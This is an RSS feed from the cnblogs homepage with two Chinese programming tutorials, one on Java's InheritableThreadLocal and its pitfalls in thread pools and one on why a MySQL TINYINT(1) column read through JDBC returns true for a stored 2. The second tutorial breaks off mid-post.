{
  "title": "主页 - 博客园",
  "link": "https://www.cnblogs.com/",
  "description": "主页 - 博客园 RSS",
  "entries": [
    {
      "title": "InheritableThreadLocal，从入门到放弃",
      "link": "https://www.cnblogs.com/sevencoding/p/19484504",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/sevencoding/p/19484504\" id=\"cb_post_title_url\" title=\"发布于 2026-01-19 09:00\">\n    <span>InheritableThreadLocal，从入门到放弃</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>InheritableThreadLocal相比ThreadLocal多一个能力：在创建子线程Thread时，子线程Thread会自动继承父线程的InheritableThreadLocal信息到子线程中，进而实现在在子线程获取父线程的InheritableThreadLocal值的目的。</p>\n<p>关于ThreadLocal详细内容，可以看这篇文章：<a href=\"https://mp.weixin.qq.com/s?__biz=MzkwNjc0MzU1Mg==&amp;mid=2247484942&amp;idx=1&amp;sn=7e414e401be057e6bf8dde163d9387d9&amp;chksm=c0e29c61f7951577a7f1f037fa5ee68c445116b6e0de82ca4321fe18d66de6fea8d33cbdc232&amp;token=1187469911&amp;lang=zh_CN#rd\" rel=\"noopener nofollow\" target=\"_blank\">史上最全ThreadLocal 详解</a></p>\n<h2 id=\"和-threadlocal-的区别\">和 ThreadLocal 的区别</h2>\n<p>举个简单的栗子对比下InheritableThreadLocal和ThreadLocal：</p>\n<pre><code class=\"language-java\">public&nbsp;class&nbsp;InheritableThreadLocalTest&nbsp;{&nbsp; &nbsp;&nbsp;\n\tprivate&nbsp;static&nbsp;final ThreadLocal&lt;String&gt; threadLocal =&nbsp;new&nbsp;ThreadLocal&lt;&gt;();&nbsp; &nbsp;&nbsp;\n\tprivate&nbsp;static&nbsp;final InheritableThreadLocal&lt;String&gt; inheritableThreadLocal =&nbsp;new&nbsp;InheritableThreadLocal&lt;&gt;();&nbsp; &nbsp;&nbsp;\n\n\tpublic&nbsp;static&nbsp;void&nbsp;main(String[]&nbsp;args)&nbsp;{&nbsp; &nbsp; &nbsp; &nbsp; \n\t\ttestThreadLocal();&nbsp; &nbsp; &nbsp; &nbsp; \n\t\ttestInheritableThreadLocal();&nbsp; &nbsp; \n\t}&nbsp; &nbsp;&nbsp;\n\n\t/**&nbsp; &nbsp; &nbsp;* threadLocal测试&nbsp; &nbsp; &nbsp;*/&nbsp; &nbsp;&nbsp;\n\tpublic&nbsp;static&nbsp;void&nbsp;testThreadLocal()&nbsp;{&nbsp; &nbsp; &nbsp; &nbsp;\n\t\t&nbsp;// 在主线程中设置值到threadLocal&nbsp; &nbsp; &nbsp; &nbsp; \n\t\t&nbsp;threadLocal.set(\"我是父线程threadLocal的值\");&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t\t&nbsp;// 创建一个新线程并启动&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t\t&nbsp;new&nbsp;Thread(() -&gt; {&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t\t\t\t&nbsp;// 在子线程里面无法获取到父线程设置的threadLocal，结果为null&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \n\t\t\t\t&nbsp;System.out.println(\"从子线程获取到threadLocal的值: \"&nbsp;+ threadLocal.get());&nbsp; &nbsp; &nbsp; &nbsp;    }\n\t\t&nbsp;).start();&nbsp; &nbsp; \n\t&nbsp;}&nbsp; &nbsp;&nbsp;\n&nbsp;\n\t&nbsp;/**&nbsp; &nbsp; &nbsp;* inheritableThreadLocal测试&nbsp; &nbsp; &nbsp;*/&nbsp; \n\tpublic&nbsp;static&nbsp;void&nbsp;testInheritableThreadLocal()&nbsp;{&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t\t// 在主线程中设置一个值到inheritableThreadLocal&nbsp; &nbsp; &nbsp; &nbsp; \n\t\tinheritableThreadLocal.set(\"我是父线程inheritableThreadLocal的值\");&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t\t// 创建一个新线程并启动&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t\tnew&nbsp;Thread(() -&gt; {&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t\t\t\t// 在子线程里面可以自动获取到父线程设置的inheritableThreadLocal&nbsp; &nbsp; \n\t\t\t\tSystem.out.println(\"从子线程获取到inheritableThreadLocal的值: \"&nbsp;+ inheritableThreadLocal.get());&nbsp; &nbsp; &nbsp; &nbsp; \n\t\t\t}).start();&nbsp; &nbsp; \n\t\t}\n\t}\n</code></pre>\n<p>执行结果：</p>\n<pre><code class=\"language-text\">从子线程获取到threadLocal的值:null\n从子线程获取到inheritableThreadLocal的值:我是父线程inheritableThreadLocal的值\n</code></pre>\n<p>可以看到子线程中可以获取到父线程设置的inheritableThreadLocal值，但不能获取到父线程设置的threadLocal值</p>\n<h2 id=\"实现原理\">实现原理</h2>\n<p>InheritableThreadLocal 的实现原理相当精妙，它通过在创建子线程的瞬间，“复制”父线程的线程局部变量，从而实现了数据从父线程到子线程的<strong>一次性、创建时</strong>的传递 。</p>\n<p>其核心工作原理可以清晰地通过以下序列图展示，它描绘了当父线程创建一个子线程时，数据是如何被传递的：</p>\n<div class=\"mermaid\">sequenceDiagram\n    participant Parent as 父线程\n    participant Thread as Thread构造方法\n    participant ITL as InheritableThreadLocal\n    participant ThMap as ThreadLocalMap\n    participant Child as 子线程\n\n    Parent-&gt;&gt;Thread: 创建 new Thread()\n    Note over Parent,Thread: 关键步骤：初始化\n    Thread-&gt;&gt;Thread: 调用 init() 方法\n    Note over Thread,ITL: 检查父线程的 inheritableThreadLocals\n    Thread-&gt;&gt;+ThMap: createInheritedMap(&lt;br/&gt;parent.inheritableThreadLocals)\n    ThMap-&gt;&gt;ThMap: 新建一个ThreadLocalMap\n    loop 遍历父线程Map中的每个Entry\n        ThMap-&gt;&gt;+ITL: 调用 key.childValue(parentValue)\n        ITL--&gt;&gt;-ThMap: 返回子线程初始值&lt;br/&gt;(默认返回父值，可重写)\n        ThMap-&gt;&gt;ThMap: 将 (key, value) 放入新Map\n    end\n    ThMap--&gt;&gt;-Thread: 返回新的ThreadLocalMap对象\n    Thread-&gt;&gt;Child: 将新Map赋给子线程的&lt;br/&gt;inheritableThreadLocals属性\n    Note over Child: 子线程拥有父线程变量的副本\n</div><p>下面我们来详细拆解图中的关键环节。</p>\n<h3 id=\"核心实现机制\">核心实现机制</h3>\n<ol>\n<li>**数据结构基础：<code>Thread</code>类内部维护了两个 <code>ThreadLocalMap</code>类型的变量 ：\n<ul>\n<li><code>threadLocals</code>：用于存储普通 <code>ThreadLocal</code>设置的变量副本。</li>\n<li><code>inheritableThreadLocals</code>：专门用于存储 <code>InheritableThreadLocal</code>设置的变量副本 。<code>InheritableThreadLocal</code>通过重写 <code>getMap</code>和 <code>createMap</code>方法，使其所有操作都针对 <code>inheritableThreadLocals</code>字段，从而与普通 <code>ThreadLocal</code>分离开 。</li>\n</ul>\n</li>\n<li><strong>继承触发时刻：子线程的创建</strong>。继承行为发生在子线程被创建（即执行 <code>new Thread()</code>）时。在 <code>Thread</code>类的 <code>init</code>方法中，如果判断需要继承（<code>inheritThreadLocals</code>参数为 <code>true</code>）<strong>且</strong>父线程（当前线程）的 <code>inheritableThreadLocals</code>不为 <code>null</code>，则会执行复制逻辑 。</li>\n<li><strong>复制过程的核心：<code>createInheritedMap</code></strong>。这是实现复制的核心方法 。它会创建一个新的 <code>ThreadLocalMap</code>，并将父线程 <code>inheritableThreadLocals</code>中的所有条目遍历拷贝到新 Map 中。\n<ul>\n<li><strong>Key的复制</strong>：Key（即 <code>InheritableThreadLocal</code>对象本身）是直接复制的引用。</li>\n<li><strong>Value的生成</strong>：Value 并非直接复制引用，而是通过调用 <code>InheritableThreadLocal</code>的 <code>childValue(T parentValue)</code>方法来生成子线程中的初始值。<strong>默认实现是直接返回父值</strong>（<code>return parentValue;</code>），这意味着对于对象类型，父子线程将共享同一个对象引用 。</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"关键特性与注意事项\">关键特性与注意事项</h3>\n<ol>\n<li><strong>创建时复制，后续独立</strong>：继承只发生一次，即在子线程对象创建的瞬间。此后，父线程和子线程对各自 <code>InheritableThreadLocal</code>变量的修改互不影响 。</li>\n<li><strong>在线程池中的局限性</strong>：这是 <code>InheritableThreadLocal</code>最需要警惕的问题。线程池中的线程是复用的，这些线程在首次创建时可能已经从某个父线程继承了值。但当它们被用于执行新的任务时，新的任务提交线程（逻辑上的“父线程”）与工作线程已无直接的创建关系，因此之前继承的值不会更新，这会导致<strong>数据错乱</strong>（如用户A的任务拿到了用户B的信息）或<strong>内存泄漏</strong>​ 。对于线程池场景，应考虑使用阿里开源的 <strong>TransmittableThreadLocal (TTL)</strong>​ 。</li>\n<li><strong>浅拷贝与对象共享</strong>：由于 <code>childValue</code>方法默认是浅拷贝，如果存入的是可变对象（如 <code>Map</code>、<code>List</code>），父子线程实际持有的是同一个对象的引用。在一个线程中修改该对象的内部状态，会直接影响另一个线程 。若需隔离，可以重写 <code>childValue</code>方法实现深拷贝 。</li>\n<li><strong>内存泄漏风险</strong>：与 <code>ThreadLocal</code>类似，如果线程长时间运行（如线程池中的核心线程），并且未及时调用 <code>remove</code>方法清理，那么该线程的 <code>inheritableThreadLocals</code>会一直持有值的强引用，导致无法被GC回收。良好的实践是在任务执行完毕后主动调用 <code>remove()</code></li>\n</ol>\n<h3 id=\"线程池中局限性\">线程池中局限性</h3>\n<p>一般来说，在真实的业务场景下，没人会直接 new Thread，而都是使用线程池的，因此<code>InheritableThreadLocal</code>在线程池中的使用局限性要额外注意</p>\n<p>首先，我们先理解 <code>InheritableThreadLocal</code>的继承前提</p>\n<ul>\n<li><code>InheritableThreadLocal</code>的继承只发生在 <strong>新线程被创建时</strong>（即 <code>new Thread()</code>并启动时）。在创建过程中，子线程会复制父线程的 <code>InheritableThreadLocal</code>值。</li>\n<li>在线程池中，线程是预先创建或按需创建的，并且会被复用。因此，继承只会在线程池<strong>创建新线程</strong>时发生，而不会在复用现有线程时发生。</li>\n</ul>\n<p>再看线程池创建新线程的条件，对于标准的 <code>ThreadPoolExecutor</code>，新线程的创建遵循以下规则：</p>\n<ol>\n<li><strong>当前线程数 &lt; 核心线程数</strong>：当提交新任务时，如果当前运行的线程数小于核心线程数，即使有空闲线程，线程池也会创建新线程来处理任务。此时，新线程会继承父线程（提交任务的线程）的 <code>InheritableThreadLocal</code>。</li>\n<li><strong>当前线程数 &gt;= 核心线程数 &amp;&amp; 队列已满 &amp;&amp; 线程数 &lt; 最大线程数</strong>：当任务队列已满，且当前线程数小于最大线程数时，线程池会创建新线程来处理任务。同样，新线程会继承父线程的 <code>InheritableThreadLocal</code>。</li>\n</ol>\n<p>不会继承的场景</p>\n<ul>\n<li><strong>线程复用</strong>：当线程池中有空闲线程时（例如，当前线程数 &gt;= 核心线程数，但队列未满），任务会被分配给现有线程执行。此时，没有新线程创建，因此不会发生继承。现有线程的 <code>InheritableThreadLocal</code>值保持不变（可能是之前任务设置的值），这可能导致数据错乱（如用户A的任务看到用户B的数据）。</li>\n<li><strong>线程数已达最大值</strong>：如果线程数已达最大线程数，且队列已满，新任务会被拒绝（根据拒绝策略），也不会创建新线程，因此不会继承。</li>\n</ul>\n<p>不只是线程池污染，线程池使用 <code>InheritableThreadLocal</code> 还可能存在获取不到值的情况。例如，在执行异步任务的时候，复用了某个已有的线程A，并且当时创建该线程A的时候，没有继承InheritableThreadLocal，进而导致后面复用该线程的时候，从InheritableThreadLocal获取到的值为null：</p>\n<pre><code class=\"language-java\">public&nbsp;class&nbsp;InheritableThreadLocalWithThreadPoolTest&nbsp;{&nbsp; &nbsp;&nbsp;\n\tprivate&nbsp;static&nbsp;final InheritableThreadLocal&lt;String&gt; inheritableThreadLocal =&nbsp;new&nbsp;InheritableThreadLocal&lt;&gt;();&nbsp; &nbsp;&nbsp;\n\t// 这里线程池core/max数量都只有2&nbsp; &nbsp;&nbsp;\n\tprivate&nbsp;static&nbsp;final ThreadPoolExecutor threadPoolExecutor =&nbsp;new&nbsp;ThreadPoolExecutor(&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t\t2,&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t\t2,&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t\t0L,&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \n\t\tTimeUnit.MILLISECONDS,&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t\tnew&nbsp;LinkedBlockingQueue&lt;Runnable&gt;(3000),&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t\tnew&nbsp;ThreadPoolExecutor.CallerRunsPolicy()&nbsp; &nbsp; \n\t);&nbsp; &nbsp;&nbsp;\n\t\n\tpublic&nbsp;static&nbsp;void&nbsp;main(String[]&nbsp;args)&nbsp;{&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t// 先执行了不涉及InheritableThreadLocal的子任务初始化线程池线程&nbsp;\n\t &nbsp; &nbsp; &nbsp; testAnotherFunction();&nbsp; &nbsp; &nbsp; &nbsp; \n\t &nbsp; &nbsp; &nbsp; testAnotherFunction();&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t &nbsp; &nbsp; &nbsp; // 后执行了涉及InheritableThreadLocal\n\t &nbsp; &nbsp; &nbsp; testInheritableThreadLocalWithThreadPool(\"张三\");&nbsp; &nbsp; &nbsp; &nbsp; \n\t &nbsp; &nbsp; &nbsp; testInheritableThreadLocalWithThreadPool(\"李四\");&nbsp; &nbsp; &nbsp; &nbsp; \n\t &nbsp; &nbsp; &nbsp; threadPoolExecutor.shutdown();&nbsp; &nbsp; \n\t }&nbsp; &nbsp;&nbsp;\n\t \n\t /**&nbsp; &nbsp; &nbsp;* inheritableThreadLocal+线程池测试&nbsp; &nbsp; &nbsp;*/&nbsp; &nbsp;&nbsp;\n\t&nbsp; &nbsp; public&nbsp;static&nbsp;void&nbsp;testInheritableThreadLocalWithThreadPool(String param)&nbsp;{&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t\t&nbsp; &nbsp; // 1. 在主线程中设置一个值到inheritableThreadLocal&nbsp; &nbsp; &nbsp; &nbsp; \n\t &nbsp; &nbsp; &nbsp; &nbsp; inheritableThreadLocal.set(param);&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t &nbsp; &nbsp; &nbsp; &nbsp;// 2. 提交异步任务到线程池&nbsp; &nbsp; &nbsp; &nbsp; \n\t &nbsp; &nbsp; &nbsp; &nbsp;threadPoolExecutor.execute(() -&gt; {&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t &nbsp; &nbsp; &nbsp; &nbsp;// 3. 在线程池-子线程里面可以获取到父线程设置的inheritableThreadLocal吗？&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \n\t\t &nbsp; &nbsp; &nbsp; &nbsp;System.out.println(\"线程名: \"&nbsp;+ Thread.currentThread().getName() +&nbsp;\", 父线程设置的inheritableThreadLocal值: \"&nbsp;+ param +&nbsp;\", 子线程获取到inheritableThreadLocal的值: \"&nbsp;+ inheritableThreadLocal.get());&nbsp; &nbsp; &nbsp; &nbsp; \n\t &nbsp; &nbsp; &nbsp; &nbsp;});&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t &nbsp; &nbsp; &nbsp; &nbsp;// 4. 清除inheritableThreadLocal&nbsp; &nbsp; &nbsp; &nbsp; \n\t &nbsp; &nbsp; &nbsp; &nbsp;inheritableThreadLocal.remove();&nbsp; &nbsp; \n\t &nbsp; }&nbsp; &nbsp;&nbsp;\n\t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \n\t &nbsp; /**&nbsp; &nbsp; &nbsp;* 模拟另一个独立的功能&nbsp; &nbsp; &nbsp;*/&nbsp; &nbsp;\n\t &nbsp; public&nbsp;static&nbsp;void&nbsp;testAnotherFunction()&nbsp;{&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t\t &nbsp; // 提交异步任务到线程池&nbsp; &nbsp; &nbsp; &nbsp; \n\t &nbsp; &nbsp; &nbsp; threadPoolExecutor.execute(() -&gt; {&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n\t &nbsp; &nbsp; &nbsp; // 在线程池-子线程里面可以获取到父线程设置的inheritableThreadLocal吗？&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; \n\t\t &nbsp; &nbsp; &nbsp; System.out.println(\"线程名: \"&nbsp;+ Thread.currentThread().getName() +&nbsp;\", 线程池-子线程摸个鱼\");&nbsp; &nbsp; &nbsp; &nbsp; \n\t &nbsp; &nbsp; &nbsp; });&nbsp; &nbsp; \n\t &nbsp; }\n}\n</code></pre>\n<p>执行结果：</p>\n<pre><code class=\"language-text\">线程名:pool-1-thread-2,线程池-子线程摸个鱼\n线程名:pool-1-thread-1,线程池-子线程摸个鱼\n线程名:pool-1-thread-1,父线程设置的inheritableThreadLocal值:李四，子线程获取到inheritableThreadLocal的值:null\n线程名:pool-1-thread-2,父线程设置的inheritableThreadLocal值:张三，子线程获取到inheritableThreadLocal的值:null\n</code></pre>\n<p>当然了，解决这个问题可以考虑使用阿里开源的 <strong>TransmittableThreadLocal (TTL)</strong>，​或者在提交异步任务前，先获取线程数据，再传入。例如：</p>\n<pre><code class=\"language-java\">// 1. 在主线程中先获取inheritableThreadLocal的值\nString name = inheritableThreadLocal.get();&nbsp; &nbsp; \n&nbsp; &nbsp;&nbsp;\n// 2. 提交异步任务到线程池&nbsp; &nbsp; &nbsp; &nbsp; \nthreadPoolExecutor.execute(() -&gt; {&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n// 3. 在线程池-子线程里面直接传入数据&nbsp; \nSystem.out.println(\"线程名: \"&nbsp;+ Thread.currentThread().getName() +&nbsp;\", 父线程设置的inheritableThreadLocal值: \"&nbsp;+ param +&nbsp;\", 子线程获取到inheritableThreadLocal的值: \"&nbsp;+ name);&nbsp; &nbsp; &nbsp; &nbsp; \n\t &nbsp; &nbsp; &nbsp; &nbsp;});&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\n</code></pre>\n<h2 id=\"与-threadlocal-的对比\">与 ThreadLocal 的对比</h2>\n<table>\n<thead>\n<tr>\n<th>特性</th>\n<th>ThreadLocal</th>\n<th>InheritableThreadLocal</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>数据隔离</strong>​</td>\n<td>线程绝对隔离</td>\n<td>线程绝对隔离</td>\n</tr>\n<tr>\n<td><strong>子线程继承</strong>​</td>\n<td><strong>不支持</strong>​</td>\n<td><strong>支持</strong>（创建时）</td>\n</tr>\n<tr>\n<td><strong>底层存储字段</strong>​</td>\n<td><code>Thread.threadLocals</code></td>\n<td><code>Thread.inheritableThreadLocals</code></td>\n</tr>\n<tr>\n<td><strong>适用场景</strong>​</td>\n<td>线程内全局变量，避免传参</td>\n<td><strong>父子线程间</strong>需要传递上下文数据</td>\n</tr>\n</tbody>\n</table>\n\n</div>\n<div id=\"MySignature\">\n    <p>本文来自在线网站：seven的菜鸟成长之路，作者：seven，转载请注明原文链接：www.seven97.top</p>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-19 09:00</span>&nbsp;\n<a href=\"https://www.cnblogs.com/sevencoding\">程序员Seven</a>&nbsp;\n阅读(<span id=\"post_view_count\">15</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "TINYINT(1) 类型的字段，明明数据存的是 2，为什么查出来是 true",
      "link": "https://www.cnblogs.com/youzhibing/p/19498073",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/youzhibing/p/19498073\" id=\"cb_post_title_url\" title=\"发布于 2026-01-19 08:58\">\n    <span>TINYINT(1) 类型的字段，明明数据存的是 2，为什么查出来是 true</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        MySQL整数类型后面的n是显示宽度，表示显示时最少占n个字符宽度，既不会限制列存储的数值范围，也不会截断比列显示宽度更宽的值；不使用TINYINT(1)，直接使用TINYINT(4)或TINYINT\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h2 id=\"开心一刻\">开心一刻</h2>\n<p>大学期间，跟初恋谈了一段刻骨铭心的恋情，因为某些原因，大学毕业后分手了。<br />\n如今大学毕业已经10年，听说她很早就出国了，而我，很早就成的哥了。<br />\n昨天，初恋坐上了我的的车，我一眼就认出了她，她亦如当初模样，而我却满脸沧桑。<br />\n我不敢打招呼，默默的听着她打电话，讲述着国外的种种。<br />\n快到目的地的时候，她放下了电话说：我已经把我这10年的经历都说给你听了，你连句你好都不说吗<br />\n我知道电话那头没有任何人，她是故意说给我听的，我哽咽着颤抖的说到：你好<br />\n她深情的看着我，问道：我们还回得去吗<br />\n我疑惑的望向她，说到：回去？回去可以啊，但得加钱......</p>\n<div align=\"center\"><img src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230496-740629878.gif\" /></div>\n<h2 id=\"tinyint\">TINYINT</h2>\n<p>关于 <code>TINYINT</code>，我相信大家都知道它，是数据库的一种数据类型，说的详细点，它是数据库的一种数字类型，再详细点，它是数据库的一种整数类型；需要注意的是，它并非 SQL 标准整数类型</p>\n<blockquote>\n<p>SQL标准整数类型：INTEGER<code>(or</code>INT<code>) and </code>SMALLINT</p>\n</blockquote>\n<p>而是某些数据库的拓展整数类型，所以并非所有的关系型数据库都支持 TINYINT，支持的数据库类型包括 <code>MySQL</code>、<code>MariaDB</code>、<code>SQL Server</code>；我们基于 <code>MySQL</code> 来看看 TINYINT</p>\n<p>MySQL 官方对<a href=\"https://dev.mysql.com/doc/refman/8.0/en/integer-types.html\" rel=\"noopener nofollow\" target=\"_blank\">整数类型</a>有如下介绍</p>\n<div align=\"center\"><img alt=\"整数类型\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230116-563676929.png\" /></div>\n<p>除了 <code>TINYINT</code>，MySQL 还拓展出了 <code>MEDIUMINT</code> 和 <code>BIGINT</code>，这些都不是 SQL 标准整数类型，在做不同库数据迁移的时候需要考虑这些点</p>\n<blockquote>\n<p>标准 SQL，便于迁移；做表设计的时候，尽量用 SQL 标准数据类型</p>\n</blockquote>\n<p>TINYINT 存储空间占 <strong>1</strong> 字节，有符号的值范围是 -128 到 127，无符号的值范围是 0 到 255</p>\n<p>TINYINT 的基本介绍已经完成，下面开始实操环节，开始之前我先问你们一个问题</p>\n<blockquote>\n<p>在实际项目中，你们一般用 TINYINT 存什么 ？</p>\n</blockquote>\n<p>是不是用来存枚举值？例如这样</p>\n<pre><code class=\"language-sql\">`exec_status` TINYINT DEFAULT 0 COMMENT '执行-状态，0：等待中，1：执行中，2：成功，3：失败，4：终止'\n</code></pre>\n<p>甚至在枚举值少的时候，会使用 <code>TINYINT(1)</code>，对不对？重点来了</p>\n<div align=\"center\"><img alt=\"640 (8)\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229648-1266766793.jpg\" /></div>\n<p>TINYINT(1) 中的 <code>1</code> 表示什么？很多小伙伴会理所当然的回答道：<strong>数值范围</strong>，TINYINT(1) 表示的是数值范围是 -9 到 9，或者 0 ~ 9</p>\n<p>对不对呢？我们验证下就知道了。基于 MySQL 8.0.31，我们创建表</p>\n<pre><code class=\"language-sql\">CREATE TABLE `tbl_qsl_job` (\n  `id` int NOT NULL COMMENT '主键',\n  `exec_status` tinyint(1) DEFAULT 0 COMMENT '执行-状态，0：等待中，1：执行中，2：成功，3：失败，4：终止',\n  PRIMARY KEY (`id`)\n) ENGINE=InnoDB;\n</code></pre>\n<p>插入一条记录</p>\n<pre><code class=\"language-sql\">INSERT INTO tbl_qsl_job(id, exec_status) VALUES(1, 12);\n</code></pre>\n<p>结果会怎么样，超出范围报错？</p>\n<p>实际是插入成功</p>\n<div align=\"center\"><img alt=\"tinyint1_插入12成功\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229673-110950449.png\" /></div>\n<p>道心是不是碎了一地？</p>\n<div align=\"center\"><img alt=\"掀桌子\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229763-87845519.png\" /></div>\n<p>给你们 10 秒钟，收拾下破碎的道心；收拾好了之后我们一起看看官方说明：<a href=\"https://dev.mysql.com/doc/refman/5.7/en/numeric-type-attributes.html\" rel=\"noopener nofollow\" target=\"_blank\">Numeric Type Attributes</a></p>\n<blockquote>\n<p>MySQL supports an extension for optionally specifying the display width of integer data types in parentheses following the base keyword for the type. For example, <a href=\"https://dev.mysql.com/doc/refman/5.7/en/integer-types.html\" rel=\"noopener nofollow\" target=\"_blank\"><code>INT(4)</code></a> specifies an <a href=\"https://dev.mysql.com/doc/refman/5.7/en/integer-types.html\" rel=\"noopener nofollow\" target=\"_blank\"><code>INT</code></a> with a display width of four digits. This optional display width may be used by applications to display integer values having a width less than the width specified for the column by left-padding them with spaces. (That is, this width is present in the metadata returned with result sets. Whether it is used is up to the application.)</p>\n<p>The display width does <em>not</em> constrain the range of values that can be stored in the column. Nor does it prevent values wider than the column display width from being displayed correctly. For example, a column specified as <a href=\"https://dev.mysql.com/doc/refman/5.7/en/integer-types.html\" rel=\"noopener nofollow\" target=\"_blank\"><code>SMALLINT(3)</code></a> has the usual <a href=\"https://dev.mysql.com/doc/refman/5.7/en/integer-types.html\" rel=\"noopener nofollow\" target=\"_blank\"><code>SMALLINT</code></a> range of <code>-32768</code> to <code>32767</code>, and values outside the range permitted by three digits are displayed in full using more than three digits.</p>\n</blockquote>\n<p>相信你们都能看懂，INT(n) 中的 n 表示的是显示宽度，INT(4) 表示的是显示宽度为四位数的 INT。应用程序可以采用左填充空格的方式来填充宽度不够列指定宽度的整数值（也就是说，此宽度会作为结果集的元数据返回，是否使用取决于应用程序）</p>\n<p>显示宽度不会限制列存储的数值范围，也不会截断比列显示宽度更宽的值。例如，SMALLINT(3) 类型的列的存数范围与 SMALLINT 一样，也是 32768 到 32767，超出三位数的值会完整显示</p>\n<p>关于整数类型显示宽度，我们可以进行如下总结</p>\n<blockquote>\n<p>类型后面的 n，是显示宽度，表示显示时最少占 n 个字符宽度，既不会限制列存储的数值范围，也不会截断比列显示宽度更宽的值，</p>\n<p>显示宽度会作为结果集的元数据返回，是否使用取决于应用程序（这个伏笔，后面会呼应，值得我们留意）</p>\n</blockquote>\n<h2 id=\"2-变-true\">2 变 true</h2>\n<p>我们把 tbl_qsl_job 中 id = 1 的记录的状态改成 2（因为没有枚举值 12）</p>\n<pre><code class=\"language-sql\">UPDATE tbl_qsl_job SET exec_status = 2 WHERE id = 1;\n</code></pre>\n<p>基于 <code>SpringBoot 2.7.18</code>、<code>spring-jdbc 5.3.31 </code>、<code>HikariCP 4.0.3</code>、<code>mysql-connector-java 8.0.25 </code> 构建查询</p>\n<pre><code class=\"language-java\">package com.qsl;\n\nimport org.junit.jupiter.api.Test;\nimport org.springframework.boot.test.context.SpringBootTest;\nimport org.springframework.jdbc.core.JdbcTemplate;\nimport org.springframework.jdbc.support.rowset.SqlRowSet;\nimport org.springframework.jdbc.support.rowset.SqlRowSetMetaData;\n\nimport javax.annotation.Resource;\n\n/**\n * @author youzb\n */\n@SpringBootTest(classes = Application.class)\npublic class QslJobTest {\n\n    @Resource\n    private JdbcTemplate jdbcTemplate;\n\n    @Test\n    public void getByJdbcTemplate() {\n        SqlRowSet sqlRowSet = jdbcTemplate.queryForRowSet(\"SELECT * FROM tbl_qsl_job WHERE id = 1\");\n        SqlRowSetMetaData metaData = sqlRowSet.getMetaData();\n        while (sqlRowSet.next()) {\n            for (int i = 1; i &lt;= metaData.getColumnCount(); i++) {\n                System.out.print(sqlRowSet.getObject(i) + \" \");\n            }\n            System.out.println();\n        }\n    }\n}\n</code></pre>\n<p>你们觉得执行结果是怎样的，是不是 <code>1 2</code> 呢</p>\n<div align=\"center\"><img alt=\"2变true\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230065-2086643304.png\" /></div>\n<p>可以看到，结果并不是 <code>1 2</code>，而是 <code>1 true</code>，是不是有点懵？</p>\n<blockquote>\n<p>明明数据存的是 2，为什么查出来结果是 true？</p>\n</blockquote>\n<div align=\"center\"><img alt=\"懵\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230105-1018176054.png\" width=\"200px\" /></div>\n<p>首先我们可以确定的是，数据库存储的值是没问题的，因为通过 <code>navicat</code> 查到的结果是 2（也说明 navicat 没有对这个值做特殊转换）</p>\n<div align=\"center\"><img alt=\"数据库中值是2\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112230148-777704073.png\" /></div>\n<p>回到我们的程序，数据库中的 2 到程序控制台的 true，经过了那些环节，我们是不是能整理出来？</p>\n<div align=\"center\"><img alt=\"数据流转\" src=\"https://img2024.cnblogs.com/blog/747662/202601/747662-20260118112229966-212214453.png\" 